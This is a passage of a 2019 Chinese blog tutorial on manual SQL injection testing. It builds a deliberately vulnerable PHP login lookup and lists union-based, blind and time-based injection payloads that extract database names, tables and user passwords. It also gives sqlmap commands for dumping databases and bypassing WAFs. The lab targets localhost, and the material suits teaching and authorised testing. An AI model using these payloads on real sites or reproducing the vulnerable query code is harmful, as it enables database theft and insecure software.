+<p>这样的话这句SQL请求,在后台的执行结果就变成了以下的样子.<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> first_name <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>()<span class="comment">#'</span></span><br></pre></td></tr></table></figure></p>
+<p>如上,我们不仅可以得到id=1的first_name,还可以得到当前数据库的相关信息,这是开发人员所没有想到的,以上只是一个简单的SQL注入的例子.从根本上讲,当开发人员对用户的输入过滤不严,造成了用户可以通过输入SQL语句控制数据库,就会产生SQL注入漏洞.</p>
+<p>简而言之,基于字符型的SQL注入即存在SQL注入漏洞的URL参数为字符串类型(需要使用单引号表示),字符型SQL注入的关键就是单引号的闭合,例如以下几个例子:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> idproduct=’ <span class="number">13</span>’;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">name</span>=’ fendo’;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">data</span>=’ <span class="number">01</span>/<span class="number">01</span>/<span class="number">2017</span>’;</span><br></pre></td></tr></table></figure></p>
+<h3 id="◆搭建演练环境◆-1"><a href="#◆搭建演练环境◆-1" class="headerlink" title="◆搭建演练环境◆"></a>◆搭建演练环境◆</h3><p>1.首先我们在原来的基础上,新建一个文件<code>/var/www/html/index.php</code>.<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">vim /<span class="keyword">var</span>/www/html/index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'username'</span>];</span><br><span class="line">$conn=mysql_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"1233"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db(<span class="string">'fendo'</span>,$conn);</span><br><span class="line">$sql=<span class="string">"select * from user where username = '$name'"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"用户ID："</span>.$row[<span class="string">'id'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"用户名："</span>.$row[<span class="string">'username'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"用户密码："</span>.$row[<span class="string">'password'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"用户邮箱："</span>.$row[<span class="string">'email'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysql_close($conn);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"后台执行的SQL语句: "</span>.<span class="string">"$sql &lt;br &gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>2.进入数据库,创建几个表结构,并插入几条测试数据.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># mysql -uroot -p</span></span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; create database fendo;</span><br><span class="line">MariaDB [(none)]&gt; use fendo;</span><br><span class="line">MariaDB [fendo]&gt; create table user(</span><br><span class="line">    -&gt; id int not null,</span><br><span class="line">    -&gt; username varchar(100) not null,</span><br><span class="line">    -&gt; password varchar(100) not null,</span><br><span class="line">    -&gt; email varchar(200) not null</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">insert into user(id,username,password,email) values(1,<span class="string">'admin'</span>,<span class="string">'fendo'</span>,<span class="string">'10010@qq.com'</span>);</span><br><span class="line">insert into user(id,username,password,email) values(2,<span class="string">'guest'</span>,<span class="string">'goods'</span>,<span class="string">'10020@qq.com'</span>);</span><br><span class="line">insert into user(id,username,password,email) values(3,<span class="string">'lyshark'</span>,<span class="string">'nice'</span>,<span class="string">'10030@qq.com'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>3.重启apache服务,并访问页面测试效果.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># systemctl restart httpd</span></span><br><span class="line">[root@localhost ~]<span class="comment"># curl http://127.0.0.1/index1.php?username=lyshark</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="◆字符注入技巧◆"><a href="#◆字符注入技巧◆" class="headerlink" title="◆字符注入技巧◆"></a>◆字符注入技巧◆</h3><p><strong>检测注入点:</strong> 字符型的检测方式与整数型差不多,但需要对数据进行SQL语句的手动闭合,如下所示.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?username=admin<span class="string">' and '</span>1<span class="string">'='</span>1</span><br><span class="line">index.php?username=admin<span class="string">' and '</span>1<span class="string">'='</span>0</span><br><span class="line">index.php?username=admin<span class="string">' and '</span>1<span class="string">'=1--'</span></span><br><span class="line">index.php?username=admin<span class="string">' or '</span>1<span class="string">'=1--'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>猜字段长度:</strong> 接着我们通过使用<code>union select</code>语句,猜测数据库列的长度,字段长度.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?username=admin <span class="string">' union select 1,1,1 and '</span>1<span class="string">'='</span>1    // 显示错误,说明字段大于3</span><br><span class="line">index.php?username=admin <span class="string">' union select 1,1,1,1 and '</span>1<span class="string">'='</span>1  // 显示正确,该表存在4个字段</span><br><span class="line">index.php?username=admin <span class="string">' union select 1,1,1,1'</span>            // 这样也可以完成语句的闭合</span><br><span class="line">index.php?username=admin <span class="string">' union select null,null,null,null'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>猜敏感信息:</strong> 接着替换上面语句中的<code>1,1,1,1</code>替换为MySQL执行函数,猜敏感信息.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?username=admin<span class="string">' union select database(),1,@@version,@@datadir'</span></span><br><span class="line">index.php?username=admin<span class="string">' union select database(),1,@@version,@@datadir and '</span>1<span class="string">'='</span>0</span><br></pre></td></tr></table></figure></p>
+<p><strong>猜表是否存在:</strong> 猜指定表是否存在,语句执行结束并没报错,也就说明存在user这个表.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?username=admin<span class="string">'+and+(select+count(*)+from+user)&gt;0+and+'</span><span class="string">'='</span>      // 存在user这个表</span><br><span class="line">index.php?username=admin<span class="string">'+and+(select+count(*)+from+lyshark)&gt;0+and+'</span><span class="string">'='</span>   // 不存在lyshark这个表</span><br></pre></td></tr></table></figure></p>
+<p><strong>查全部表名称:</strong> 通过以下语句,查询<code>fendo</code>数据库中存在的所有表名称.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?username=admin<span class="string">' union select 1,1,1,group_concat(table_name)</span></span><br><span class="line"><span class="string">&gt;                  from information_schema.tables where table_schema="fendo"'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>查表中字段:</strong> 查询<code>fendo</code>数据库中,<code>user</code>表中的字段,并显示出来.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?username=admin<span class="string">' union select 1,1,1,group_concat(column_name)</span></span><br><span class="line"><span class="string">&gt;                  from information_schema.columns where</span></span><br><span class="line"><span class="string">&gt;                  table_schema="fendo" and table_name="user"'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>查表中数据:</strong> 查询<code>fendo</code>数据库中,<code>user</code>表中指定字段的数据,并显示出来.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?username=<span class="string">'admin'</span> union select 1,group_concat(password),1,1 from user<span class="string">'</span></span><br><span class="line"><span class="string">index.php?username='</span>admin<span class="string">' union select id,username,password,email from user'</span></span><br></pre></td></tr></table></figure></p>
+<p>上面的这些例子就是字符型注入的常用手法,其他的注入方式和整数型没有什么太大的区别,这里为了节约篇幅不在继续往下写了,你可以使用MySQL提供的基本函数自行测试.<br><br></p>
+<h2 id="手工检查盲注"><a href="#手工检查盲注" class="headerlink" title="手工检查盲注"></a>手工检查盲注</h2><p><strong>猜版本:</strong> 返回正常,说明数据库版本是5,返回错误说明大于或小于5.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and left(version(),1)=5<span class="comment">#        // 返回正常,说明数据库版本是5</span></span><br><span class="line">index.php?id=1 and left(version(),1)=4<span class="comment">#        // 返回错误,说明数据库版本不是5</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>猜库名:</strong> 通过盲注的形式,逐级猜测每一个数据库的单元,最后将其组合在一起即可.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and (length(database())) &gt;=4                    // 猜库名称有多少个字符串</span><br><span class="line"></span><br><span class="line">index.php?id=1 and (left(database(),1)) &gt;= <span class="string">'d'</span>   <span class="comment">#              // 猜库名称最左边第1位为d</span></span><br><span class="line">index.php?id=1 and (left(database(),2)) &gt;= <span class="string">'dv'</span>  <span class="comment">#              // 猜库名称左边前2位位为dv</span></span><br><span class="line">index.php?id=1 and (left(database(),3)) &gt;= <span class="string">'dvw'</span> <span class="comment">#              // 猜库名称左边前3位位为dvw</span></span><br><span class="line">index.php?id=1 and (left(database(),4)) &gt;= <span class="string">'dvwa'</span><span class="comment">#              // 猜库名称左边前4位位为dvwa</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index.php?id=1<span class="string">' and ord(mid((CAST(DATABASE() AS CHAR)),1,1))=100 #          // 第1位是d</span></span><br><span class="line"><span class="string">index.php?id=1'</span> and ord(mid((CAST(DATABASE() AS CHAR)),2,1))=118 <span class="comment">#          // 第2位是v</span></span><br><span class="line">index.php?id=1<span class="string">' and ord(mid((CAST(DATABASE() AS CHAR)),3,1))=119 #          // 第3位是w</span></span><br><span class="line"><span class="string">index.php?id=1'</span> and ord(mid((CAST(DATABASE() AS CHAR)),4,1))=97 <span class="comment">#           // 第4位是a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mid ((a,b,c)                     // 从字符串a中截取b到c位置</span><br><span class="line">ord()                            // 将结果转化为ascii码与后面数值对比</span><br><span class="line">CAST(DATABASE() AS CHAR)         // 如果取到了数据则返回</span><br></pre></td></tr></table></figure></p>
+<p><strong>猜表名:</strong> 如果网页返回正常,则说明存在这个表,返回不正常说明不存在.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">公式: and (select count(*) from 表名) &gt;=0</span><br><span class="line"></span><br><span class="line">index.php?id=1 and (select count(*) from mysql.user) &gt;=0     // 存在mysql.user表</span><br><span class="line">index.php?id=1 and (select count(*) from lyshark) &gt;=0        // 存在lyshark表</span><br></pre></td></tr></table></figure></p>
+<p><strong>猜字段:</strong> 如果网页返回正常,说明存在猜测的字段,不正常则需要继续猜.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">公式: and (select count(字段名) from 猜到的表名)&gt;=0</span><br><span class="line"></span><br><span class="line">index.php?id=1 and (select count(id) from users) &gt;=0       // 返回正常说明存在id字段</span><br><span class="line">index.php?id=1 and (select count(name) from users) &gt;=0     // 返回不正常不存在name字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index.php?id=1 and (select count(*) from lyshark) &gt;=3 <span class="comment">#--   // 返回表中记录数</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>用户名猜测:</strong> 通过正则符号也可使完成多指定用户的探测,其他函数用法相同.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1<span class="string">' and (length(user())) &gt;=14 #                // 猜测数据库用户名称长度</span></span><br><span class="line"><span class="string">index.php?id=1'</span> and (select user() like <span class="string">'root%'</span>) <span class="comment">#         // 猜测用户名</span></span><br><span class="line">index.php?id=1<span class="string">' and (select user() regexp '</span>^[a-z]<span class="string">') #      // 猜测开头a-z</span></span><br><span class="line"><span class="string">index.php?id=1'</span> and (select user() regexp <span class="string">'^r'</span>) <span class="comment">#          // 第一位是r</span></span><br><span class="line">index.php?id=1<span class="string">' and (select user() regexp '</span>^ro<span class="string">') #         // 第二位是o</span></span><br><span class="line"><span class="string">index.php?id=1'</span> and (select user() regexp <span class="string">'^root'</span>) <span class="comment">#       // 以此类推猜测前四位</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>延时注入:</strong> 通过<code>sleep(5)</code>延时的方式,我们同样可以判断是否存在注入点.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and sleep(5) <span class="comment">#</span></span><br><span class="line">index.php?id=1 and sleep(5) order by 3 <span class="comment">#      // 如果是3个字段,则会延时5秒</span></span><br><span class="line"></span><br><span class="line">index.php?id=1 and select <span class="keyword">if</span>(length(user())=0,sleep(3),1) <span class="comment">#    //如果user=0则延时3秒</span></span><br><span class="line">index.php?id=1 and <span class="keyword">if</span>(hex(mid(user(),1,1))=100,sleep(3),1) <span class="comment">#   // 第1个字符=d则延时3秒</span></span><br><span class="line">index.php?id=1 and <span class="keyword">if</span>(hex(mid(user(),1,1))=118,sleep(3),1) <span class="comment">#   // 第2个字符=v则延时3秒</span></span><br></pre></td></tr></table></figure></p>
+<p><br></p>
+<h2 id="SQLMap-拓展"><a href="#SQLMap-拓展" class="headerlink" title="SQLMap(拓展)"></a>SQLMap(拓展)</h2><p><strong>常用脱库命令:</strong> SQLMap工具内默认的数据库检索与脱裤子命令.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 --identify-waf                  <span class="comment">#测试是否有WAF</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 --current-db                    <span class="comment">#查询当前数据库</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 --users                         <span class="comment">#查询所有用户名</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 --current-user                  <span class="comment">#查询当前用户名</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 --dbs                           <span class="comment">#列出所有数据库</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 -D <span class="string">"mysql"</span> --tables             <span class="comment">#获取数据库中的表</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 -D <span class="string">"mysql"</span> -T <span class="string">"host"</span> --columns  <span class="comment">#获取表的列名称</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 -D <span class="string">"mysql"</span> -T <span class="string">"host"</span> --dump     <span class="comment">#脱mysql.host的裤子</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 -D <span class="string">"mysql"</span> --dump-all           <span class="comment">#脱mysql数据库的裤子</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> -v 3 -D <span class="string">"mysql"</span> -T <span class="string">"user"</span> -C <span class="string">"Host,User,Password"</span> --dump</span><br></pre></td></tr></table></figure></p>
+<p><strong>Cookie注入:</strong> 默认情况使用GET/POST注入,<code>level &gt;=2使用cookie注入</code>,<code>level &gt;=3使用User-agent/Referer注入</code>.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> -v 3 --cookie id=1 --level 2                        <span class="comment">#判断注入点</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> -v 3 --cookie id=1 --dbs --level 2                  <span class="comment">#猜数据库名</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> -v 3 --cookie id=1 --tables --level 2               <span class="comment">#猜表名称</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> -v 3 --cookie id=1 -T 表名 --clumns --level 2        <span class="comment">#猜字段</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> -v 3 --cookie id=1 -T 表名 --clumns --dump --level 2 <span class="comment">#猜内容</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>POST注入:</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（1）浏览器打开目标地址http:// www.xxx.com /Login.asp</span><br><span class="line">（2）配置burp代理(127.0.0.1:8080)以拦截请求</span><br><span class="line">（3）点击login表单的submit按钮</span><br><span class="line">（4）这时候Burp会拦截到了我们的登录POST请求</span><br><span class="line">（5）把这个post请求复制为txt, 我这命名为test.txt 然后把它放至sqlmap目录下</span><br><span class="line">（6）运行sqlmap并执行如下命令：</span><br><span class="line"></span><br><span class="line">1、列数据库：</span><br><span class="line">sqlmap -r  test.txt  -p  username  –dbs</span><br><span class="line"></span><br><span class="line">注：-r表示加载一个文件，-p指定参数</span><br><span class="line"></span><br><span class="line">2、选择一个数据库列表名</span><br><span class="line"> Sqlmap -r  test.txt -p username -D mysql –tables</span><br><span class="line"></span><br><span class="line">3、猜列名</span><br><span class="line">Sqlmap -r test.txt -p username -D mysql -T user –columns</span><br><span class="line"></span><br><span class="line">4、猜字段名</span><br><span class="line">sqlmap -r test.txt -p username -D mysql -T user -C “User,Password” –dump</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u “ –smart –dbms “Mysql”-b <span class="comment">#获取banner信息 </span></span><br><span class="line">sqlmap -u “ –smart –dbms “Mysql”–method “POST” — data “id=1&amp;cat=2″ <span class="comment">#post注入</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>延时注入:</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> --dbs   --delay    1</span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> --dbs  --safe-freq   3</span><br></pre></td></tr></table></figure></p>
+<p><strong>绕过WAF:</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> --thread 10 --identify-waf</span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> --thread 10 --check-waf</span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/index.php"</span> -v 3 --dbs --batch --tamper <span class="string">"script.py"</span></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------</span><br><span class="line">apostrophemask.py    用utf8代替引号</span><br><span class="line">equaltolike.py       like 代替等号</span><br><span class="line">space2dash.py</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/Fly_hps/article/details/80198827</span><br><span class="line">https://blog.csdn.net/u011781521/article/category/6504894</span><br></pre></td></tr></table></figure></p>
+<p><br></p>
+
+      
+    </div>
+
+    
+
+<!--增加的底部版权代码-->
+<div>
+      
+        
+<div class="my_post_copyright">
+  <p><span>本文标题:</span><a href="/2019/03/28/渗透测试/手工检测SQL注入漏洞/">手工检测SQL注入漏洞</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 王瑞 的个人博客">王瑞</a></p>
+  <p><span>发布时间:</span>2019年03月28日 - 10:03</p>
+  <p><span>最后更新:</span>2019年04月16日 - 20:04</p>
+  <p><span>原始链接:</span><a href="/2019/03/28/渗透测试/手工检测SQL注入漏洞/" title="手工检测SQL注入漏洞">https://www.mkdirs.com/2019/03/28/渗透测试/手工检测SQL注入漏洞/</a>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者</p>
+</div>
+
+      
+</div>
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"> <i class="fa fa-tag"></i> 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/21/网络设备配置/思科设备ACL与NAT技术/" rel="next" title="思科设备ACL与NAT技术">
+                <i class="fa fa-chevron-left"></i> 思科设备ACL与NAT技术
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/31/渗透测试/Nmap 网络扫描器笔记/" rel="prev" title="Nmap 网络扫描器笔记">
+                Nmap 网络扫描器笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="王瑞">
+            
+              <p class="site-author-name" itemprop="name">王瑞</p>
+              <div class="site-description motion-element" itemprop="description">记录点滴技术成长之路</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/lyshark" title="GitHub &rarr; https://github.com/lyshark" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="mailto:1181506874@qq.com" title="E-Mail &rarr; mailto:1181506874@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://plus.google.com/lyshark" title="Google &rarr; https://plus.google.com/lyshark" rel="noopener" target="_blank"><i class="fa fa-fw fa-google"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/lyshark" title="Twitter &rarr; https://twitter.com/lyshark" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="http://wpa.qq.com/msgrd?v=3&uin=1181506874&site=hupaiyule&menu=yes" title="QQ &rarr; http://wpa.qq.com/msgrd?v=3&uin=1181506874&site=hupaiyule&menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://weixin.qq.com" title="Wechat &rarr; https://weixin.qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-weixin"></i></a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#数字型注入"><span class="nav-text">数字型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#◆搭建演练环境◆"><span class="nav-text">◆搭建演练环境◆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#◆判断注入点◆"><span class="nav-text">◆判断注入点◆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#◆常用判断语句◆"><span class="nav-text">◆常用判断语句◆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#◆判断表字段数◆"><span class="nav-text">◆判断表字段数◆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#◆查库与表名称◆"><span class="nav-text">◆查库与表名称◆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#◆查字段与数据◆"><span class="nav-text">◆查字段与数据◆</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#字符型注入"><span class="nav-text">字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#◆搭建演练环境◆-1"><span class="nav-text">◆搭建演练环境◆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#◆字符注入技巧◆"><span class="nav-text">◆字符注入技巧◆</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手工检查盲注"><span class="nav-text">手工检查盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMap-拓展"><span class="nav-text">SQLMap(拓展)</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+
+<!-- 屏蔽版权开始 -->
+&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">王瑞</span>
+<!-- 屏蔽版权结束 -->
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
